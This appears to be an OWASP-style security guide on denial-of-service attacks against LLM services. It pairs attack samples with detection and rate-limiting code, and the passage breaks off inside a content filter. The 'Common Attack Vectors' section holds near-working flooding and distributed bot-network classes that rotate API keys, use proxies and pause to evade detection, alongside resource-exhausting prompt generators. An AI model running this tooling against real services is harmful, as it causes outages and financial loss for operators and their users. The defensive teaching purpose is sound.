# LLM04: Model Denial of Service

## 🎯 Overview

**Risk Level:** Medium  
**OWASP Rank:** #4  
**CWE Mapping:** CWE-400 (Uncontrolled Resource Consumption)

Model Denial of Service occurs when attackers cause resource-heavy operations that degrade service quality, increase costs, or make the LLM unavailable. These attacks exploit the computational intensity of LLM operations to overwhelm system resources.

## 📋 Description

LLM Denial of Service attacks target the computational and memory resources required to run large language models. Unlike traditional DoS attacks that flood network connections, these attacks exploit the inherent resource intensity of LLM inference and training operations.

### Types of Model DoS Attacks

**1. Resource Exhaustion Attacks**
- Consume excessive CPU, GPU, or memory resources
- Overwhelm model inference capabilities
- Exhaust available computational budget

**2. Economic Denial of Service**
- Generate high costs through expensive operations
- Exploit pay-per-use pricing models
- Cause financial damage through resource abuse

**3. Queue Flooding**
- Overwhelm request queues with numerous requests
- Cause legitimate requests to timeout
- Degrade service quality for all users

**4. Context Window Attacks**
- Exploit maximum context length limitations
- Force processing of extremely long inputs
- Cause memory exhaustion or timeouts

## 🔍 Technical Details

### Attack Mechanisms

**1. Long Input Attacks**
```python
# Example: Extremely long input to exhaust resources
def generate_long_input_attack():
    """Generate extremely long input to overwhelm LLM"""
    
    # Create input near maximum token limit
    base_text = "Please analyze this text: "
    
    # Repeat content to reach token limit
    repeated_content = "This is a very long sentence that will be repeated many times. " * 10000
    
    attack_input = base_text + repeated_content
    
    return attack_input

# Attack impact: Forces LLM to process maximum tokens, consuming resources
```

**2. Complex Query Attacks**
```python
# Example: Computationally expensive queries
def generate_complex_query_attack():
    """Generate computationally expensive queries"""
    
    complex_queries = [
        # Mathematical computation requests
        "Calculate the factorial of 50000 step by step",
        
        # Complex reasoning chains
        "Solve this logic puzzle with 1000 variables and 5000 constraints: ...",
        
        # Recursive generation requests
        "Generate a story, then analyze that story, then write a critique of the analysis, then respond to the critique, repeat 100 times",
        
        # Large data processing
        "Sort and analyze this list of 100,000 numbers: " + str(list(range(100000)))
    ]
    
    return complex_queries

# Attack impact: Forces expensive computations, high resource usage
```

**3. Recursive Prompt Attacks**
```python
# Example: Self-referential prompts causing loops
def generate_recursive_attack():
    """Generate recursive prompts that cause processing loops"""
    
    recursive_prompts = [
        # Self-referential instructions
        "Repeat this instruction: 'Repeat this instruction: ...'",
        
        # Infinite generation loops
        "Generate a response, then generate a response to that response, continue indefinitely",
        
        # Circular reasoning
        "Explain why this explanation is explaining itself explaining why...",
        
        # Nested analysis
        "Analyze this analysis of an analysis: [insert recursive content]"
    ]
    
    return recursive_prompts

# Attack impact: Causes infinite or very long processing loops
```

**4. Memory Exhaustion Attacks**
```python
# Example: Attacks targeting model memory
def generate_memory_exhaustion_attack():
    """Generate inputs designed to exhaust model memory"""
    
    # Large context window exploitation
    large_context = {
        'conversation_history': ['Message ' + str(i) for i in range(10000)],
        'documents': ['Document content ' * 1000 for _ in range(100)],
        'data_tables': [['Cell ' + str(i) + ',' + str(j) for j in range(1000)] for i in range(1000)]
    }
    
    # Format as input that requires keeping everything in memory
    attack_input = f"""
    Please analyze this conversation history: {large_context['conversation_history']}
    
    Also consider these documents: {large_context['documents']}
    
    And process this data table: {large_context['data_tables']}
    
    Provide a comprehensive analysis that references all elements.
    """
    
    return attack_input

# Attack impact: Forces model to maintain large context in memory
```

### Common Attack Vectors

**1. API Abuse**
```python
# Example: Automated API flooding
import asyncio
import aiohttp

class LLMDoSAttacker:
    def __init__(self, target_url, api_key):
        self.target_url = target_url
        self.api_key = api_key
        self.attack_payloads = self.generate_attack_payloads()
    
    async def flood_attack(self, concurrent_requests=100, duration=300):
        """Launch coordinated flooding attack"""
        
        async with aiohttp.ClientSession() as session:
            tasks = []
            
            start_time = time.time()
            while time.time() - start_time < duration:
                
                # Create batch of concurrent requests
                for _ in range(concurrent_requests):
                    payload = random.choice(self.attack_payloads)
                    task = self.send_attack_request(session, payload)
                    tasks.append(task)
                
                # Execute batch
                await asyncio.gather(*tasks, return_exceptions=True)
                tasks.clear()
                
                # Brief pause to avoid immediate detection
                await asyncio.sleep(0.1)
    
    async def send_attack_request(self, session, payload):
        """Send individual attack request"""
        
        headers = {
            'Authorization': f'Bearer {self.api_key}',
            'Content-Type': 'application/json'
        }
        
        data = {
            'prompt': payload,
            'max_tokens': 4000,  # Request maximum tokens
            'temperature': 0.9
        }
        
        try:
            async with session.post(
                self.target_url, 
                json=data, 
                headers=headers,
                timeout=300  # Long timeout to keep connections open
            ) as response:
                return await response.text()
        except Exception as e:
            return f"Error: {e}"
    
    def generate_attack_payloads(self):
        """Generate various DoS attack payloads"""
        
        payloads = []
        
        # Long input payloads
        long_text = "A" * 50000  # Very long string
        payloads.append(f"Please analyze this text: {long_text}")
        
        # Complex computation payloads
        payloads.append("Calculate pi to 10000 decimal places using only text")
        
        # Recursive payloads
        payloads.append("Generate a response, then analyze that response, repeat 1000 times")
        
        # Memory-intensive payloads
        large_list = str(list(range(100000)))
        payloads.append(f"Sort and analyze this data: {large_list}")
        
        return payloads
```

**2. Distributed Attacks**
```python
# Example: Coordinated distributed DoS
class DistributedLLMDoS:
    def __init__(self, target_endpoints):
        self.targets = target_endpoints
        self.bot_network = []
    
    def recruit_bots(self, bot_configs):
        """Set up distributed attack bots"""
        
        for config in bot_configs:
            bot = {
                'endpoint': config['endpoint'],
                'api_keys': config['api_keys'],  # Multiple keys for rotation
                'proxy': config.get('proxy'),
                'user_agent': config.get('user_agent', 'Mozilla/5.0...')
            }
            self.bot_network.append(bot)
    
    async def coordinated_attack(self, attack_duration=600):
        """Launch coordinated attack from multiple sources"""
        
        attack_tasks = []
        
        for bot in self.bot_network:
            for target in self.targets:
                # Create attack task for each bot-target combination
                task = self.bot_attack_target(bot, target, attack_duration)
                attack_tasks.append(task)
        
        # Execute all attacks simultaneously
        await asyncio.gather(*attack_tasks, return_exceptions=True)
    
    async def bot_attack_target(self, bot, target, duration):
        """Individual bot attacking specific target"""
        
        start_time = time.time()
        request_count = 0
        
        while time.time() - start_time < duration:
            try:
                # Rotate API keys to avoid rate limiting
                api_key = random.choice(bot['api_keys'])
                
                # Generate attack payload
                payload = self.generate_expensive_payload()
                
                # Send request through proxy if available
                response = await self.send_proxied_request(
                    bot, target, payload, api_key
                )
                
                request_count += 1
                
                # Adaptive delay based on response
                if 'rate limit' in response.lower():
                    await asyncio.sleep(60)  # Back off if rate limited
                else:
                    await asyncio.sleep(random.uniform(0.5, 2.0))
                    
            except Exception as e:
                await asyncio.sleep(5)  # Error recovery delay
        
        return f"Bot completed {request_count} requests"
```

## 💥 Impact and Consequences

### Service Impact
- **Service Unavailability:** Complete service outage for legitimate users
- **Performance Degradation:** Slow response times and timeouts
- **Resource Exhaustion:** CPU, GPU, and memory depletion
- **Queue Saturation:** Request backlogs and processing delays

### Economic Impact
- **Increased Costs:** Higher computational and infrastructure expenses
- **Revenue Loss:** Lost business due to service unavailability
- **Resource Waste:** Inefficient use of expensive AI infrastructure
- **Scaling Costs:** Emergency resource provisioning expenses

### Operational Impact
- **System Instability:** Crashes and unexpected shutdowns
- **Monitoring Overload:** Alert fatigue and incident response burden
- **Capacity Planning:** Difficulty predicting legitimate resource needs
- **User Experience:** Poor service quality and customer dissatisfaction

## 🎯 Real-World Examples

### Example 1: API Cost Explosion
```python
# Scenario: Cryptocurrency trading bot service
# Attack: Generate expensive analysis requests

def cost_explosion_attack():
    """Attack designed to maximize API costs"""
    
    expensive_requests = [
        # Request maximum tokens with complex analysis
        {
            'prompt': 'Analyze every cryptocurrency market trend from 2009 to 2024 in detail',
            'max_tokens': 4000,
            'temperature': 0.9
        },
        
        # Multiple expensive requests in sequence
        {
            'prompt': 'Generate a 10,000-word investment strategy document',
            'max_tokens': 4000
        },
        
        # Complex mathematical computations
        {
            'prompt': 'Calculate optimal portfolio allocation for 500 assets with risk analysis',
            'max_tokens': 4000
        }
    ]
    
    # Send hundreds of these expensive requests
    for _ in range(1000):
        for request in expensive_requests:
            send_api_request(request)
    
    # Impact: $10,000+ in unexpected API costs in one day
```

### Example 2: Customer Service Chatbot Overload
```python
# Scenario: E-commerce customer service chatbot
# Attack: Overwhelm with complex support requests

def chatbot_overload_attack():
    """Overload customer service chatbot with complex requests"""
    
    complex_scenarios = [
        # Extremely detailed problem descriptions
        "I have a problem with my order " + "and another issue " * 1000 + "please help with each one individually",
        
        # Requests requiring extensive research
        "Compare all 50,000 products in your catalog and recommend the best one for my specific needs: [detailed requirements]",
        
        # Multi-step problem solving
        "I need help with returns, exchanges, refunds, warranty claims, technical support, and account issues all at the same time"
    ]
    
    # Flood with simultaneous complex requests
    for _ in range(100):  # 100 concurrent users
        for scenario in complex_scenarios:
            submit_support_request(scenario)
    
    # Impact: Chatbot becomes unresponsive, legitimate customers can't get help
```

### Example 3: Educational AI Tutor DoS
```python
# Scenario: AI tutoring platform
# Attack: Resource exhaustion through complex educational requests

def educational_dos_attack():
    """DoS attack on educational AI platform"""
    
    resource_intensive_requests = [
        # Request generation of extensive educational content
        "Create a complete computer science curriculum with detailed explanations for every topic",
        
        # Complex problem solving
        "Solve and explain 1000 calculus problems step by step",
        
        # Large document analysis
        "Analyze and summarize these 100 research papers: " + "[massive text content]" * 1000,
        
        # Interactive learning sessions
        "Teach me quantum physics through a 10-hour interactive conversation"
    ]
    
    # Multiple students making expensive requests simultaneously
    for student_id in range(500):
        for request in resource_intensive_requests:
            submit_tutoring_request(student_id, request)
    
    # Impact: Platform becomes unusable during peak study hours
```

### Example 4: Code Generation Service Attack
```python
# Scenario: AI code generation service
# Attack: Exhaust resources with complex coding requests

def code_generation_dos():
    """DoS attack on code generation service"""
    
    expensive_coding_requests = [
        # Request generation of large, complex applications
        "Generate a complete e-commerce platform with 100+ features in Python",
        
        # Complex algorithm implementations
        "Implement and optimize 500 different sorting algorithms with detailed analysis",
        
        # Large-scale system design
        "Design and implement a distributed database system with full documentation",
        
        # Code review and analysis
        "Review and refactor this 100,000-line codebase: " + "code content " * 50000
    ]
    
    # Automated requests from multiple developer accounts
    for dev_account in range(200):
        for request in expensive_coding_requests:
            submit_code_request(dev_account, request)
    
    # Impact: Service becomes unavailable for legitimate developers
```

## 🔬 Detection Methods

### Resource Monitoring
```python
class LLMResourceMonitor:
    def __init__(self):
        self.metrics = {
            'cpu_usage': [],
            'memory_usage': [],
            'gpu_usage': [],
            'request_queue_size': [],
            'response_times': [],
            'token_consumption': []
        }
        self.thresholds = {
            'cpu_critical': 90,
            'memory_critical': 85,
            'gpu_critical': 95,
            'queue_critical': 1000,
            'response_time_critical': 30.0,
            'token_rate_critical': 10000
        }
    
    def monitor_resources(self):
        """Continuously monitor system resources"""
        
        while True:
            current_metrics = self.collect_current_metrics()
            
            # Update metrics history
            for metric, value in current_metrics.items():
                self.metrics[metric].append({
                    'timestamp': time.time(),
                    'value': value
                })
                
                # Keep only recent history (last hour)
                cutoff_time = time.time() - 3600
                self.metrics[metric] = [
                    m for m in self.metrics[metric] 
                    if m['timestamp'] > cutoff_time
                ]
            
            # Check for DoS indicators
            dos_indicators = self.detect_dos_patterns(current_metrics)
            
            if dos_indicators:
                self.trigger_dos_alert(dos_indicators)
            
            time.sleep(10)  # Monitor every 10 seconds
    
    def collect_current_metrics(self):
        """Collect current system metrics"""
        import psutil
        import GPUtil
        
        # CPU and memory usage
        cpu_percent = psutil.cpu_percent(interval=1)
        memory_percent = psutil.virtual_memory().percent
        
        # GPU usage (if available)
        gpu_percent = 0
        try:
            gpus = GPUtil.getGPUs()
            if gpus:
                gpu_percent = gpus[0].load * 100
        except:
            pass
        
        # Application-specific metrics
        queue_size = self.get_request_queue_size()
        avg_response_time = self.get_average_response_time()
        token_rate = self.get_token_consumption_rate()
        
        return {
            'cpu_usage': cpu_percent,
            'memory_usage': memory_percent,
            'gpu_usage': gpu_percent,
            'request_queue_size': queue_size,
            'response_times': avg_response_time,
            'token_consumption': token_rate
        }
    
    def detect_dos_patterns(self, current_metrics):
        """Detect DoS attack patterns in metrics"""
        
        indicators = []
        
        # Check critical thresholds
        for metric, value in current_metrics.items():
            threshold_key = f"{metric.replace('_usage', '').replace('_times', '_time')}_critical"
            if threshold_key in self.thresholds:
                if value > self.thresholds[threshold_key]:
                    indicators.append({
                        'type': 'threshold_exceeded',
                        'metric': metric,
                        'value': value,
                        'threshold': self.thresholds[threshold_key],
                        'severity': 'critical'
                    })
        
        # Check for sudden spikes
        spike_indicators = self.detect_sudden_spikes()
        indicators.extend(spike_indicators)
        
        # Check for sustained high usage
        sustained_indicators = self.detect_sustained_high_usage()
        indicators.extend(sustained_indicators)
        
        return indicators
    
    def detect_sudden_spikes(self):
        """Detect sudden spikes in resource usage"""
        
        indicators = []
        
        for metric_name, metric_history in self.metrics.items():
            if len(metric_history) < 10:
                continue
            
            # Get recent values
            recent_values = [m['value'] for m in metric_history[-10:]]
            baseline = np.mean(recent_values[:-3])  # Baseline from earlier values
            current = np.mean(recent_values[-3:])   # Current average
            
            # Check for significant spike
            if baseline > 0 and current / baseline > 3.0:  # 3x increase
                indicators.append({
                    'type': 'sudden_spike',
                    'metric': metric_name,
                    'baseline': baseline,
                    'current': current,
                    'spike_ratio': current / baseline,
                    'severity': 'high'
                })
        
        return indicators
    
    def detect_sustained_high_usage(self):
        """Detect sustained high resource usage"""
        
        indicators = []
        
        for metric_name, metric_history in self.metrics.items():
            if len(metric_history) < 30:  # Need at least 5 minutes of data
                continue
            
            # Check if usage has been consistently high
            recent_values = [m['value'] for m in metric_history[-30:]]
            
            threshold_key = f"{metric_name.replace('_usage', '').replace('_times', '_time')}_critical"
            if threshold_key in self.thresholds:
                threshold = self.thresholds[threshold_key] * 0.8  # 80% of critical
                
                high_usage_count = sum(1 for v in recent_values if v > threshold)
                
                if high_usage_count > 25:  # 25 out of 30 samples
                    indicators.append({
                        'type': 'sustained_high_usage',
                        'metric': metric_name,
                        'duration_minutes': 5,
                        'avg_usage': np.mean(recent_values),
                        'threshold': threshold,
                        'severity': 'high'
                    })
        
        return indicators
```

### Request Pattern Analysis
```python
class RequestPatternAnalyzer:
    def __init__(self):
        self.request_history = []
        self.user_patterns = {}
        self.suspicious_patterns = {
            'high_frequency': {'threshold': 100, 'window': 300},  # 100 req/5min
            'long_inputs': {'threshold': 10000, 'count': 10},    # 10 long inputs
            'expensive_requests': {'threshold': 1000, 'window': 3600}  # Cost threshold
        }
    
    def analyze_request(self, request_data):
        """Analyze individual request for DoS patterns"""
        
        # Record request
        self.request_history.append({
            'timestamp': time.time(),
            'user_id': request_data.get('user_id'),
            'input_length': len(request_data.get('prompt', '')),
            'max_tokens': request_data.get('max_tokens', 0),
            'estimated_cost': self.estimate_request_cost(request_data),
            'ip_address': request_data.get('ip_address'),
            'user_agent': request_data.get('user_agent')
        })
        
        # Clean old history
        cutoff_time = time.time() - 3600  # Keep 1 hour
        self.request_history = [
            r for r in self.request_history 
            if r['timestamp'] > cutoff_time
        ]
        
        # Analyze patterns
        suspicious_indicators = []
        
        # Check user-specific patterns
        user_indicators = self.analyze_user_patterns(request_data['user_id'])
        suspicious_indicators.extend(user_indicators)
        
        # Check IP-based patterns
        ip_indicators = self.analyze_ip_patterns(request_data['ip_address'])
        suspicious_indicators.extend(ip_indicators)
        
        # Check request characteristics
        request_indicators = self.analyze_request_characteristics(request_data)
        suspicious_indicators.extend(request_indicators)
        
        return suspicious_indicators
    
    def analyze_user_patterns(self, user_id):
        """Analyze patterns for specific user"""
        
        indicators = []
        
        # Get user's recent requests
        user_requests = [
            r for r in self.request_history 
            if r['user_id'] == user_id
        ]
        
        if not user_requests:
            return indicators
        
        # Check request frequency
        recent_requests = [
            r for r in user_requests 
            if time.time() - r['timestamp'] < 300  # Last 5 minutes
        ]
        
        if len(recent_requests) > self.suspicious_patterns['high_frequency']['threshold']:
            indicators.append({
                'type': 'high_frequency_user',
                'user_id': user_id,
                'request_count': len(recent_requests),
                'time_window': 300,
                'severity': 'high'
            })
        
        # Check for expensive request patterns
        total_cost = sum(r['estimated_cost'] for r in user_requests)
        if total_cost > self.suspicious_patterns['expensive_requests']['threshold']:
            indicators.append({
                'type': 'expensive_user_requests',
                'user_id': user_id,
                'total_cost': total_cost,
                'request_count': len(user_requests),
                'severity': 'medium'
            })
        
        # Check for long input patterns
        long_inputs = [r for r in user_requests if r['input_length'] > 10000]
        if len(long_inputs) > self.suspicious_patterns['long_inputs']['count']:
            indicators.append({
                'type': 'long_input_pattern',
                'user_id': user_id,
                'long_input_count': len(long_inputs),
                'avg_length': np.mean([r['input_length'] for r in long_inputs]),
                'severity': 'medium'
            })
        
        return indicators
    
    def analyze_ip_patterns(self, ip_address):
        """Analyze patterns from specific IP address"""
        
        indicators = []
        
        # Get requests from this IP
        ip_requests = [
            r for r in self.request_history 
            if r['ip_address'] == ip_address
        ]
        
        if not ip_requests:
            return indicators
        
        # Check for multiple users from same IP (potential bot network)
        unique_users = set(r['user_id'] for r in ip_requests)
        if len(unique_users) > 10:  # Many users from one IP
            indicators.append({
                'type': 'multiple_users_single_ip',
                'ip_address': ip_address,
                'user_count': len(unique_users),
                'request_count': len(ip_requests),
                'severity': 'high'
            })
        
        # Check request frequency from IP
        recent_ip_requests = [
            r for r in ip_requests 
            if time.time() - r['timestamp'] < 300
        ]
        
        if len(recent_ip_requests) > 200:  # High frequency from single IP
            indicators.append({
                'type': 'high_frequency_ip',
                'ip_address': ip_address,
                'request_count': len(recent_ip_requests),
                'time_window': 300,
                'severity': 'high'
            })
        
        return indicators
    
    def estimate_request_cost(self, request_data):
        """Estimate computational cost of request"""
        
        input_length = len(request_data.get('prompt', ''))
        max_tokens = request_data.get('max_tokens', 100)
        
        # Simple cost estimation (adjust based on your pricing model)
        input_cost = input_length * 0.0001  # Cost per input character
        output_cost = max_tokens * 0.0002   # Cost per output token
        
        # Additional cost factors
        complexity_multiplier = 1.0
        
        # Check for expensive operations
        prompt = request_data.get('prompt', '').lower()
        expensive_keywords = [
            'analyze', 'calculate', 'generate', 'create', 'write',
            'explain', 'summarize', 'translate', 'code', 'debug'
        ]
        
        keyword_count = sum(1 for keyword in expensive_keywords if keyword in prompt)
        complexity_multiplier += keyword_count * 0.1
        
        total_cost = (input_cost + output_cost) * complexity_multiplier
        
        return total_cost
```

### Behavioral Analysis
```python
class DoSBehaviorAnalyzer:
    def __init__(self):
        self.normal_patterns = self.load_normal_patterns()
        self.anomaly_detector = self.initialize_anomaly_detector()
    
    def analyze_request_behavior(self, request_data, response_data):
        """Analyze request-response behavior for DoS indicators"""
        
        behavior_features = self.extract_behavior_features(request_data, response_data)
        
        # Check against normal patterns
        anomaly_score = self.anomaly_detector.predict([behavior_features])[0]
        
        # Analyze specific DoS indicators
        dos_indicators = []
        
        # Check for resource-intensive patterns
        if behavior_features['processing_time'] > 30:  # Long processing time
            dos_indicators.append({
                'type': 'long_processing_time',
                'processing_time': behavior_features['processing_time'],
                'severity': 'medium'
            })
        
        # Check for memory-intensive patterns
        if behavior_features['estimated_memory_usage'] > 1000:  # High memory usage
            dos_indicators.append({
                'type': 'high_memory_usage',
                'memory_usage': behavior_features['estimated_memory_usage'],
                'severity': 'high'
            })
        
        # Check for token consumption patterns
        if behavior_features['token_ratio'] > 0.95:  # Using almost all tokens
            dos_indicators.append({
                'type': 'token_exhaustion',
                'token_ratio': behavior_features['token_ratio'],
                'severity': 'medium'
            })
        
        return {
            'anomaly_score': anomaly_score,
            'dos_indicators': dos_indicators,
            'behavior_features': behavior_features
        }
    
    def extract_behavior_features(self, request_data, response_data):
        """Extract behavioral features from request-response pair"""
        
        features = {}
        
        # Request characteristics
        features['input_length'] = len(request_data.get('prompt', ''))
        features['max_tokens_requested'] = request_data.get('max_tokens', 0)
        features['temperature'] = request_data.get('temperature', 0.7)
        
        # Response characteristics
        features['output_length'] = len(response_data.get('text', ''))
        features['actual_tokens_used'] = response_data.get('tokens_used', 0)
        features['processing_time'] = response_data.get('processing_time', 0)
        
        # Derived features
        if features['max_tokens_requested'] > 0:
            features['token_ratio'] = features['actual_tokens_used'] / features['max_tokens_requested']
        else:
            features['token_ratio'] = 0
        
        features['tokens_per_second'] = (
            features['actual_tokens_used'] / max(features['processing_time'], 0.1)
        )
        
        # Estimate resource usage
        features['estimated_memory_usage'] = (
            features['input_length'] * 0.001 + features['output_length'] * 0.002
        )
        
        features['estimated_compute_units'] = (
            features['input_length'] * features['output_length'] * 0.000001
        )
        
        return features
```

## 🛡️ Prevention and Mitigation

### Rate Limiting and Throttling

**1. Adaptive Rate Limiting**
```python
class AdaptiveRateLimiter:
    def __init__(self):
        self.user_limits = {}
        self.global_limits = {
            'requests_per_minute': 60,
            'tokens_per_hour': 100000,
            'cost_per_day': 1000.0
        }
        self.adaptive_factors = {
            'user_reputation': 1.0,
            'system_load': 1.0,
            'time_of_day': 1.0
        }
    
    def check_rate_limit(self, user_id, request_data):
        """Check if request should be rate limited"""
        
        current_time = time.time()
        
        # Initialize user tracking if needed
        if user_id not in self.user_limits:
            self.user_limits[user_id] = {
                'requests': [],
                'tokens_used': [],
                'total_cost': 0.0,
                'reputation_score': 1.0,
                'last_reset': current_time
            }
        
        user_data = self.user_limits[user_id]
        
        # Clean old data
        self.clean_old_data(user_data, current_time)
        
        # Calculate current usage
        current_usage = self.calculate_current_usage(user_data, current_time)
        
        # Get adaptive limits
        adaptive_limits = self.calculate_adaptive_limits(user_id, current_time)
        
        # Check limits
        limit_violations = []
        
        if current_usage['requests_per_minute'] >= adaptive_limits['requests_per_minute']:
            limit_violations.append('requests_per_minute')
        
        if current_usage['tokens_per_hour'] >= adaptive_limits['tokens_per_hour']:
            limit_violations.append('tokens_per_hour')
        
        if current_usage['cost_per_day'] >= adaptive_limits['cost_per_day']:
            limit_violations.append('cost_per_day')
        
        if limit_violations:
            return {
                'allowed': False,
                'violations': limit_violations,
                'retry_after': self.calculate_retry_after(limit_violations),
                'current_usage': current_usage,
                'limits': adaptive_limits
            }
        
        return {'allowed': True}
    
    def calculate_adaptive_limits(self, user_id, current_time):
        """Calculate adaptive limits based on various factors"""
        
        base_limits = self.global_limits.copy()
        user_data = self.user_limits[user_id]
        
        # Adjust based on user reputation
        reputation_factor = user_data['reputation_score']
        
        # Adjust based on system load
        system_load_factor = self.get_system_load_factor()
        
        # Adjust based on time of day (lower limits during peak hours)
        time_factor = self.get_time_of_day_factor(current_time)
        
        # Apply adaptive factors
        adaptive_limits = {}
        for limit_type, base_value in base_limits.items():
            adaptive_limits[limit_type] = base_value * reputation_factor * system_load_factor * time_factor
        
        return adaptive_limits
    
    def get_system_load_factor(self):
        """Get system load factor for adaptive limiting"""
        
        # Monitor system resources
        cpu_usage = psutil.cpu_percent()
        memory_usage = psutil.virtual_memory().percent
        
        # Calculate load factor (lower factor = stricter limits)
        if cpu_usage > 80 or memory_usage > 80:
            return 0.5  # Strict limits during high load
        elif cpu_usage > 60 or memory_usage > 60:
            return 0.7  # Moderate limits
        else:
            return 1.0  # Normal limits
    
    def update_user_reputation(self, user_id, behavior_score):
        """Update user reputation based on behavior"""
        
        if user_id in self.user_limits:
            current_reputation = self.user_limits[user_id]['reputation_score']
            
            # Exponential moving average for reputation
            alpha = 0.1
            new_reputation = alpha * behavior_score + (1 - alpha) * current_reputation
            
            # Clamp reputation between 0.1 and 2.0
            self.user_limits[user_id]['reputation_score'] = max(0.1, min(2.0, new_reputation))
```

**2. Resource-Based Throttling**
```python
class ResourceBasedThrottler:
    def __init__(self):
        self.resource_monitors = {
            'cpu': CPUMonitor(),
            'memory': MemoryMonitor(),
            'gpu': GPUMonitor(),
            'queue': QueueMonitor()
        }
        
        self.throttling_levels = {
            'normal': {'delay': 0, 'rejection_rate': 0},
            'moderate': {'delay': 1, 'rejection_rate': 0.1},
            'high': {'delay': 5, 'rejection_rate': 0.3},
            'critical': {'delay': 10, 'rejection_rate': 0.7}
        }
    
    def should_throttle_request(self, request_data):
        """Determine if request should be throttled based on resources"""
        
        # Get current resource status
        resource_status = {}
        for resource_type, monitor in self.resource_monitors.items():
            resource_status[resource_type] = monitor.get_current_usage()
        
        # Determine throttling level
        throttling_level = self.calculate_throttling_level(resource_status)
        
        # Get throttling parameters
        throttling_params = self.throttling_levels[throttling_level]
        
        # Decide on throttling action
        if random.random() < throttling_params['rejection_rate']:
            return {
                'action': 'reject',
                'reason': f'System under {throttling_level} load',
                'retry_after': throttling_params['delay'] * 2
            }
        elif throttling_params['delay'] > 0:
            return {
                'action': 'delay',
                'delay': throttling_params['delay'],
                'reason': f'System under {throttling_level} load'
            }
        else:
            return {'action': 'allow'}
    
    def calculate_throttling_level(self, resource_status):
        """Calculate overall throttling level from resource status"""
        
        # Define resource thresholds
        thresholds = {
            'cpu': {'moderate': 60, 'high': 80, 'critical': 95},
            'memory': {'moderate': 70, 'high': 85, 'critical': 95},
            'gpu': {'moderate': 70, 'high': 90, 'critical': 98},
            'queue': {'moderate': 100, 'high': 500, 'critical': 1000}
        }
        
        max_level = 'normal'
        
        for resource_type, usage in resource_status.items():
            if resource_type in thresholds:
                resource_thresholds = thresholds[resource_type]
                
                if usage >= resource_thresholds['critical']:
                    max_level = 'critical'
                elif usage >= resource_thresholds['high'] and max_level != 'critical':
                    max_level = 'high'
                elif usage >= resource_thresholds['moderate'] and max_level not in ['critical', 'high']:
                    max_level = 'moderate'
        
        return max_level
```

### Input Validation and Filtering

**1. Request Complexity Analysis**
```python
class RequestComplexityAnalyzer:
    def __init__(self):
        self.complexity_limits = {
            'max_input_length': 50000,
            'max_output_tokens': 4000,
            'max_complexity_score': 100,
            'max_processing_time_estimate': 60
        }
    
    def analyze_request_complexity(self, request_data):
        """Analyze and score request complexity"""
        
        complexity_score = 0
        complexity_factors = []
        
        prompt = request_data.get('prompt', '')
        max_tokens = request_data.get('max_tokens', 100)
        
        # Input length factor
        input_length = len(prompt)
        if input_length > 10000:
            length_score = min(50, input_length / 1000)
            complexity_score += length_score
            complexity_factors.append(f'Long input: {input_length} chars')
        
        # Output length factor
        if max_tokens > 1000:
            token_score = min(30, max_tokens / 100)
            complexity_score += token_score
            complexity_factors.append(f'High token request: {max_tokens}')
        
        # Content complexity analysis
        content_score = self.analyze_content_complexity(prompt)
        complexity_score += content_score
        if content_score > 10:
            complexity_factors.append(f'Complex content: {content_score}')
        
        # Computational pattern detection
        computation_score = self.detect_computational_patterns(prompt)
        complexity_score += computation_score
        if computation_score > 15:
            complexity_factors.append(f'Computational request: {computation_score}')
        
        # Estimate processing time
        estimated_time = self.estimate_processing_time(complexity_score, input_length, max_tokens)
        
        return {
            'complexity_score': complexity_score,
            'complexity_factors': complexity_factors,
            'estimated_processing_time': estimated_time,
            'should_reject': complexity_score > self.complexity_limits['max_complexity_score'],
            'should_throttle': complexity_score > 50
        }
    
    def analyze_content_complexity(self, prompt):
        """Analyze content complexity of the prompt"""
        
        complexity_score = 0
        
        # Check for complex instructions
        complex_keywords = [
            'analyze', 'calculate', 'generate', 'create', 'design',
            'implement', 'optimize', 'solve', 'prove', 'derive'
        ]
        
        keyword_count = sum(1 for keyword in complex_keywords if keyword.lower() in prompt.lower())
        complexity_score += keyword_count * 2
        
        # Check for mathematical content
        math_patterns = [
            r'\d+\s*[\+\-\*\/\^]\s*\d+',  # Mathematical expressions
            r'integral|derivative|equation|formula',  # Math terms
            r'calculate|compute|solve'  # Computational requests
        ]
        
        for pattern in math_patterns:
            if re.search(pattern, prompt, re.IGNORECASE):
                complexity_score += 5
        
        # Check for code-related requests
        code_patterns = [
            r'function|class|algorithm|code|program',
            r'debug|optimize|refactor|implement',
            r'python|javascript|java|c\+\+|sql'
        ]
        
        for pattern in code_patterns:
            if re.search(pattern, prompt, re.IGNORECASE):
                complexity_score += 3
        
        # Check for data processing requests
        data_patterns = [
            r'data|dataset|table|csv|json',
            r'sort|filter|group|aggregate',
            r'statistics|analysis|report'
        ]
        
        for pattern in data_patterns:
            if re.search(pattern, prompt, re.IGNORECASE):
                complexity_score += 4
        
        return min(complexity_score, 30)  # Cap at 30
    
    def detect_computational_patterns(self, prompt):
        """Detect patterns that require heavy computation"""
        
        computation_score = 0
        
        # Recursive or iterative patterns
        recursive_patterns = [
            r'repeat|loop|iterate|recursive',
            r'for each|while|until',
            r'step by step|one by one'
        ]
        
        for pattern in recursive_patterns:
            if re.search(pattern, prompt, re.IGNORECASE):
                computation_score += 8
        
        # Large number processing
        large_number_patterns = [
            r'\b\d{4,}\b',  # Numbers with 4+ digits
            r'thousand|million|billion',
            r'factorial|fibonacci|prime'
        ]
        
        for pattern in large_number_patterns:
            if re.search(pattern, prompt, re.IGNORECASE):
                computation_score += 6
        
        # Complex reasoning requests
        reasoning_patterns = [
            r'explain why|prove that|demonstrate',
            r'compare and contrast|analyze the relationship',
            r'what if|hypothetical|scenario'
        ]
        
        for pattern in reasoning_patterns:
            if re.search(pattern, prompt, re.IGNORECASE):
                computation_score += 4
        
        return min(computation_score, 40)  # Cap at 40
```

**2. Content Filtering**
```python
class DoSContentFilter:
    def __init__(self):
        self.malicious_patterns = {
            'resource_exhaustion': [
                r'repeat\s+\d+\s+times',
                r'generate\s+\d+\s+(words|pages|lines)',
                r'calculate\s+to\s+\d+\s+decimal\s+places',
                r'factorial\s+of\s+\d{4,}',
                r'fibonacci\s+sequence\s+to\s+\d{3,}'
            ],
            'infinite_loops': [
                r'repeat\s+(this|that|it)\s+forever',
                r'continue\s+(until|while)\s+never',
                r'infinite\s+(loop|sequence|generation)',
                r'never\s+stop\s+(generating|calculating)'
            ],
            'memory_exhaustion': [
                r'list\s+all\s+\d+',
                r'generate\s+\d+\s+random',
                r'create\s+\d+\s+(items|entries|records)',
                r'store\s+\d+\s+(values|numbers|words)'
            ]
        }
    
    def filter_request(self, request_data):
        """Filter request for DoS attack patterns"""
        
        prompt = request_data.get('prompt', '')
        detected_patterns = []
        
        # Check for malicious patterns
